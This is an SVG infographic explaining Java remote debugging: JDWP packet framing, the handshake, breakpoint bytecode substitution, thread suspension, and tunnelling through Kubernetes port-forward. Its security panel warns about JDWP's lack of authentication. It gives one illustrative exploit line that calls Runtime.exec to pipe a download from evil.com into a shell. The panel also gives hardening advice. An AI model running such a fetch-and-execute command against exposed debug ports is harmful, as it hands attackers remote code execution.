<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 820" width="100%" height="100%">
  <defs>
    <linearGradient id="bgGrad" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#0b0f19" />
      <stop offset="100%" stop-color="#111827" />
    </linearGradient>

    <linearGradient id="cardGrad" x1="0%" y1="0%" x2="0%" y2="100%">
      <stop offset="0%" stop-color="#1e293b" />
      <stop offset="100%" stop-color="#0f172a" />
    </linearGradient>

    <marker id="arrowCyan" markerWidth="8" markerHeight="8" refX="6" refY="4" orient="auto">
      <path d="M 0 0 L 8 4 L 0 8 z" fill="#38bdf8" />
    </marker>
    <marker id="arrowAmber" markerWidth="8" markerHeight="8" refX="6" refY="4" orient="auto">
      <path d="M 0 0 L 8 4 L 0 8 z" fill="#fbbf24" />
    </marker>
    <marker id="arrowRose" markerWidth="8" markerHeight="8" refX="6" refY="4" orient="auto">
      <path d="M 0 0 L 8 4 L 0 8 z" fill="#f43f5e" />
    </marker>
  </defs>

  <!-- Background Canvas -->
  <rect width="1200" height="820" fill="url(#bgGrad)" />

  <!-- Title & Header -->
  <g transform="translate(60, 45)">
    <text x="0" y="0" fill="#f8fafc" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="24" font-weight="700" letter-spacing="-0.5px">Java Remote Debugging Architecture (JPDA &amp; JDWP Protocol)</text>
    <text x="0" y="24" fill="#94a3b8" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="13">Wire Framing, Socket Transports, Breakpoint Bytecode Injections, and Kubernetes Tunnel Security</text>
  </g>

  <!-- PANEL 1: JPDA Stack & 11-Byte JDWP Packet (Left Column, x=60, w=345) -->
  <g transform="translate(60, 95)">
    <rect width="345" height="660" rx="12" fill="url(#cardGrad)" stroke="#334155" stroke-width="1.5" />

    <!-- Header Badge -->
    <rect x="20" y="20" width="180" height="26" rx="6" fill="#0369a1" fill-opacity="0.3" stroke="#0ea5e9" stroke-width="1" />
    <text x="30" y="37" fill="#38bdf8" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="11" font-weight="600">PANEL 1 · JPDA &amp; FRAMING</text>

    <text x="20" y="70" fill="#f1f5f9" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="16" font-weight="700">3-Tier Debugger Architecture</text>
    <text x="20" y="90" fill="#94a3b8" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="12">HotSpot JVM TI ↔ JDWP ↔ JDI Client</text>

    <!-- JPDA Stack Diagram -->
    <g transform="translate(20, 106)">
      <!-- Tier 1: Client IDE -->
      <rect x="0" y="0" width="305" height="42" rx="6" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.2" />
      <text x="14" y="20" fill="#38bdf8" font-family="-apple-system, sans-serif" font-size="11" font-weight="700">Debugger Front-End (IDE / CLI)</text>
      <text x="14" y="34" fill="#94a3b8" font-family="-apple-system, sans-serif" font-size="10">IntelliJ IDEA / VS Code / jdb CLI (uses JDI)</text>

      <!-- Connection Arrow 1 -->
      <line x1="152" y1="42" x2="152" y2="58" stroke="#38bdf8" stroke-width="1.5" marker-end="url(#arrowCyan)" />
      <text x="160" y="53" fill="#64748b" font-family="'JetBrains Mono', monospace" font-size="9.5">JDI calls</text>

      <!-- Tier 2: Wire Protocol -->
      <rect x="0" y="60" width="305" height="42" rx="6" fill="#0f172a" stroke="#34d399" stroke-width="1.2" />
      <text x="14" y="80" fill="#34d399" font-family="-apple-system, sans-serif" font-size="11" font-weight="700">JDWP Layer (dt_socket transport)</text>
      <text x="14" y="94" fill="#94a3b8" font-family="-apple-system, sans-serif" font-size="10">TCP/IP packet framing over port 5005</text>

      <!-- Connection Arrow 2 -->
      <line x1="152" y1="102" x2="152" y2="118" stroke="#34d399" stroke-width="1.5" marker-end="url(#arrowCyan)" />
      <text x="160" y="113" fill="#64748b" font-family="'JetBrains Mono', monospace" font-size="9.5">JVM TI agent</text>

      <!-- Tier 3: Target JVM -->
      <rect x="0" y="120" width="305" height="42" rx="6" fill="#0f172a" stroke="#fbbf24" stroke-width="1.2" />
      <text x="14" y="140" fill="#fbbf24" font-family="-apple-system, sans-serif" font-size="11" font-weight="700">Target JVM (HotSpot Runtime)</text>
      <text x="14" y="154" fill="#94a3b8" font-family="-apple-system, sans-serif" font-size="10">libjdwp.so agent interacting with JVM TI</text>
    </g>

    <!-- JDWP 11-Byte Header Card -->
    <text x="20" y="295" fill="#f1f5f9" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="14" font-weight="700">11-Byte JDWP Wire Packet Format</text>
    
    <rect x="20" y="310" width="305" height="155" rx="8" fill="#0f172a" stroke="#1e293b" />
    <text x="32" y="332" fill="#38bdf8" font-family="-apple-system, sans-serif" font-size="11" font-weight="700">BINARY HEADER FIELD SPECIFICATION</text>

    <!-- Field 1: Length -->
    <rect x="30" y="344" width="285" height="24" rx="4" fill="#1e293b" />
    <text x="38" y="360" fill="#f8fafc" font-family="'JetBrains Mono', monospace" font-size="10" font-weight="700">Length (4B)</text>
    <text x="120" y="360" fill="#94a3b8" font-family="-apple-system, sans-serif" font-size="10">u4: Total packet octets (incl. data)</text>

    <!-- Field 2: ID -->
    <rect x="30" y="372" width="285" height="24" rx="4" fill="#1e293b" />
    <text x="38" y="388" fill="#f8fafc" font-family="'JetBrains Mono', monospace" font-size="10" font-weight="700">ID (4B)</text>
    <text x="120" y="388" fill="#94a3b8" font-family="-apple-system, sans-serif" font-size="10">u4: Request sequence correlation ID</text>

    <!-- Field 3: Flags -->
    <rect x="30" y="400" width="285" height="24" rx="4" fill="#1e293b" />
    <text x="38" y="416" fill="#f8fafc" font-family="'JetBrains Mono', monospace" font-size="10" font-weight="700">Flags (1B)</text>
    <text x="120" y="416" fill="#94a3b8" font-family="-apple-system, sans-serif" font-size="10">0x00 = Command | 0x80 = Reply</text>

    <!-- Field 4: CmdSet / Cmd -->
    <rect x="30" y="428" width="285" height="26" rx="4" fill="#1e293b" />
    <text x="38" y="445" fill="#f8fafc" font-family="'JetBrains Mono', monospace" font-size="10" font-weight="700">Cmd / Err (2B)</text>
    <text x="120" y="445" fill="#94a3b8" font-family="-apple-system, sans-serif" font-size="10">CommandSet/Command (or ErrCode)</text>

    <!-- Suspend Flag Options Box -->
    <text x="20" y="490" fill="#f1f5f9" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="14" font-weight="700">JVM Launch Arguments: suspend=y vs n</text>

    <rect x="20" y="505" width="305" height="65" rx="6" fill="#0f172a" stroke="#1e293b" />
    <text x="32" y="525" fill="#38bdf8" font-family="'JetBrains Mono', monospace" font-size="11" font-weight="700">suspend=y (Synchronous Pause)</text>
    <text x="32" y="542" fill="#cbd5e1" font-family="-apple-system, sans-serif" font-size="10.5">JVM halts before loading main class.</text>
    <text x="32" y="558" fill="#94a3b8" font-family="-apple-system, sans-serif" font-size="10">Mandatory for debugging static init / startup crashes.</text>

    <rect x="20" y="578" width="305" height="65" rx="6" fill="#0f172a" stroke="#1e293b" />
    <text x="32" y="598" fill="#34d399" font-family="'JetBrains Mono', monospace" font-size="11" font-weight="700">suspend=n (Asynchronous Listen)</text>
    <text x="32" y="615" fill="#cbd5e1" font-family="-apple-system, sans-serif" font-size="10.5">JVM starts immediately without waiting.</text>
    <text x="32" y="631" fill="#94a3b8" font-family="-apple-system, sans-serif" font-size="10">Standard for production/staging live attached triage.</text>
  </g>

  <!-- PANEL 2: Handshake & Breakpoint Trapping (Middle Column, x=425, w=350) -->
  <g transform="translate(425, 95)">
    <rect width="350" height="660" rx="12" fill="url(#cardGrad)" stroke="#334155" stroke-width="1.5" />

    <!-- Header Badge -->
    <rect x="20" y="20" width="220" height="26" rx="6" fill="#047857" fill-opacity="0.3" stroke="#10b981" stroke-width="1" />
    <text x="30" y="37" fill="#34d399" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="11" font-weight="600">PANEL 2 · HANDSHAKE &amp; TRAPS</text>

    <text x="20" y="70" fill="#f1f5f9" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="16" font-weight="700">Wire Handshake &amp; Trapping</text>
    <text x="20" y="90" fill="#94a3b8" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="12">14-Byte ASCII synchronization sequence</text>

    <!-- Handshake Sequence Flow -->
    <rect x="20" y="106" width="310" height="155" rx="8" fill="#0f172a" stroke="#1e293b" />
    <text x="32" y="128" fill="#34d399" font-family="-apple-system, sans-serif" font-size="11" font-weight="700">JDWP PROTOCOL INITIALIZATION</text>

    <!-- Step 1 -->
    <text x="32" y="152" fill="#94a3b8" font-family="'JetBrains Mono', monospace" font-size="10">1. Client TCP SYN ───► Target Port 5005</text>
    <text x="32" y="172" fill="#38bdf8" font-family="'JetBrains Mono', monospace" font-size="10">2. Client sends: "JDWP-Handshake" (14B)</text>
    <text x="32" y="192" fill="#34d399" font-family="'JetBrains Mono', monospace" font-size="10">3. Target replies: "JDWP-Handshake" (14B)</text>
    <text x="32" y="212" fill="#fbbf24" font-family="'JetBrains Mono', monospace" font-size="10">4. Session established: Packet mode enabled</text>
    <text x="32" y="240" fill="#cbd5e1" font-family="-apple-system, sans-serif" font-size="10">Non-matching handshakes immediately drop TCP connection.</text>

    <!-- Breakpoint Injection Mechanics Box -->
    <text x="20" y="285" fill="#f1f5f9" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="14" font-weight="700">Breakpoint Bytecode Substitution</text>

    <rect x="20" y="300" width="310" height="175" rx="8" fill="#0f172a" stroke="#1e293b" />
    
    <text x="32" y="322" fill="#f8fafc" font-family="-apple-system, sans-serif" font-size="11" font-weight="700">HOW HOTSPOT TRAPS EXECUTION</text>

    <!-- Bytecode Diagram -->
    <rect x="30" y="335" width="290" height="28" rx="4" fill="#1e293b" />
    <text x="38" y="353" fill="#f43f5e" font-family="'JetBrains Mono', monospace" font-size="10">Original: [0xb6 invokevirtual] [idx_h] [idx_l]</text>

    <line x1="175" y1="363" x2="175" y2="375" stroke="#64748b" stroke-width="1.2" marker-end="url(#arrowCyan)" />

    <rect x="30" y="377" width="290" height="28" rx="4" fill="#1e293b" stroke="#38bdf8" stroke-width="1" />
    <text x="38" y="395" fill="#38bdf8" font-family="'JetBrains Mono', monospace" font-size="10">Patched:  [0xca breakpoint]   [idx_h] [idx_l]</text>

    <text x="32" y="425" fill="#94a3b8" font-family="-apple-system, sans-serif" font-size="10.5">1. JVM TI overwrites opcode with internal 0xCA trap.</text>
    <text x="32" y="442" fill="#94a3b8" font-family="-apple-system, sans-serif" font-size="10.5">2. Interpreter hits 0xCA and raises JVMTI event.</text>
    <text x="32" y="459" fill="#94a3b8" font-family="-apple-system, sans-serif" font-size="10.5">3. JIT C2 compiled code undergoes deoptimization.</text>

    <!-- Thread Safepoints Box -->
    <rect x="20" y="490" width="310" height="152" rx="6" fill="#0c1d2e" stroke="#0284c7" stroke-width="1" />
    <text x="32" y="512" fill="#38bdf8" font-family="-apple-system, sans-serif" font-size="11" font-weight="700">SAFEPOINT SUSPENSION POLICY</text>
    <text x="32" y="532" fill="#f8fafc" font-family="'JetBrains Mono', monospace" font-size="10.5">SUSPEND_ALL vs SUSPEND_EVENT_THREAD</text>
    
    <text x="32" y="555" fill="#cbd5e1" font-family="-apple-system, sans-serif" font-size="10">SUSPEND_ALL triggers global Safepoint poll, pausing</text>
    <text x="32" y="572" fill="#cbd5e1" font-family="-apple-system, sans-serif" font-size="10">all mutator threads in the JVM cluster.</text>

    <text x="32" y="598" fill="#fbbf24" font-family="-apple-system, sans-serif" font-size="10">SUSPEND_EVENT_THREAD pauses solely the hit thread,</text>
    <text x="32" y="615" fill="#fbbf24" font-family="-apple-system, sans-serif" font-size="10">allowing health checks and heartbeats to survive.</text>
  </g>

  <!-- PANEL 3: Kubernetes Tunneling & RCE Security Warning (Right Column, x=795, w=345) -->
  <g transform="translate(795, 95)">
    <rect width="345" height="660" rx="12" fill="url(#cardGrad)" stroke="#334155" stroke-width="1.5" />

    <!-- Header Badge -->
    <rect x="20" y="20" width="220" height="26" rx="6" fill="#be123c" fill-opacity="0.3" stroke="#f43f5e" stroke-width="1" />
    <text x="30" y="37" fill="#fb7185" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="11" font-weight="600">PANEL 3 · SECURITY &amp; K8S</text>

    <text x="20" y="70" fill="#f1f5f9" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="16" font-weight="700">Kubernetes &amp; RCE Security</text>
    <text x="20" y="90" fill="#94a3b8" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="12">Tunneling through container boundaries securely</text>

    <!-- Critical Security Warning Box -->
    <rect x="20" y="106" width="305" height="155" rx="8" fill="#2d0612" stroke="#f43f5e" stroke-width="1.5" />
    <text x="32" y="128" fill="#f43f5e" font-family="-apple-system, sans-serif" font-size="11" font-weight="700">CRITICAL: JDWP HAS ZERO AUTHENTICATION</text>
    <text x="32" y="146" fill="#fda4af" font-family="-apple-system, sans-serif" font-size="10.5">JDWP packets are unencrypted and unauthenticated.</text>
    
    <text x="32" y="172" fill="#cbd5e1" font-family="-apple-system, sans-serif" font-size="10">Remote Code Execution (RCE) Exploit:</text>
    <text x="32" y="190" fill="#fb7185" font-family="'JetBrains Mono', monospace" font-size="9.5">ClassType.InvokeMethod(java.lang.Runtime)</text>
    <text x="32" y="208" fill="#fb7185" font-family="'JetBrains Mono', monospace" font-size="9.5">exec("/bin/sh -c 'curl evil.com | sh'")</text>

    <text x="32" y="235" fill="#fda4af" font-family="-apple-system, sans-serif" font-size="10">NEVER expose port 5005 on public 0.0.0.0 or Ingress.</text>

    <!-- Kubernetes Tunneling Diagram -->
    <text x="20" y="285" fill="#f1f5f9" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="14" font-weight="700">Production Kubernetes Port Forwarding</text>

    <rect x="20" y="300" width="305" height="175" rx="8" fill="#0f172a" stroke="#1e293b" />
    <text x="32" y="322" fill="#38bdf8" font-family="-apple-system, sans-serif" font-size="11" font-weight="700">SECURE ENCRYPTED LOCAL TUNNEL</text>

    <!-- Step-by-step K8s flow -->
    <g transform="translate(32, 335)">
      <rect x="0" y="0" width="280" height="26" rx="4" fill="#1e293b" />
      <text x="8" y="17" fill="#f8fafc" font-family="'JetBrains Mono', monospace" font-size="9.5">Developer Host: localhost:5005</text>

      <line x1="140" y1="26" x2="140" y2="40" stroke="#38bdf8" stroke-width="1.2" marker-end="url(#arrowCyan)" />
      
      <rect x="0" y="42" width="280" height="26" rx="4" fill="#1e293b" stroke="#38bdf8" stroke-width="1" />
      <text x="8" y="59" fill="#38bdf8" font-family="'JetBrains Mono', monospace" font-size="9.5">kubectl port-forward pod 5005:5005</text>

      <line x1="140" y1="68" x2="140" y2="82" stroke="#38bdf8" stroke-width="1.2" marker-end="url(#arrowCyan)" />

      <rect x="0" y="84" width="280" height="26" rx="4" fill="#1e293b" />
      <text x="8" y="101" fill="#34d399" font-family="'JetBrains Mono', monospace" font-size="9.5">Pod Container (127.0.0.1:5005)</text>
    </g>

    <text x="32" y="462" fill="#94a3b8" font-family="-apple-system, sans-serif" font-size="10">Tunnel is TLS-authenticated via Kubernetes API server.</text>

    <!-- Safe Production Config -->
    <rect x="20" y="490" width="305" height="152" rx="6" fill="#0c1d2e" stroke="#0284c7" stroke-width="1" />
    <text x="32" y="512" fill="#38bdf8" font-family="-apple-system, sans-serif" font-size="11" font-weight="700">SAFE PRODUCTION ARGUMENT TEMPLATE</text>
    
    <rect x="30" y="525" width="285" height="42" rx="4" fill="#0b1320" />
    <text x="36" y="542" fill="#34d399" font-family="'JetBrains Mono', monospace" font-size="9">-agentlib:jdwp=transport=dt_socket,</text>
    <text x="36" y="558" fill="#34d399" font-family="'JetBrains Mono', monospace" font-size="9">server=y,suspend=n,address=127.0.0.1:5005</text>

    <text x="32" y="590" fill="#cbd5e1" font-family="-apple-system, sans-serif" font-size="10">1. Bind to loopback 127.0.0.1 (not * or 0.0.0.0).</text>
    <text x="32" y="608" fill="#cbd5e1" font-family="-apple-system, sans-serif" font-size="10">2. Keep suspend=n to prevent boot blocking.</text>
    <text x="32" y="626" fill="#cbd5e1" font-family="-apple-system, sans-serif" font-size="10">3. Require RBAC-governed kubectl tunnels.</text>
  </g>

  <!-- Author Attribution Footer -->
  <text x="600" y="792" fill="#64748b" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="12" text-anchor="middle">Architecture &amp; Design by Srinivasan Ragothaman (@rsrini7)</text>
</svg>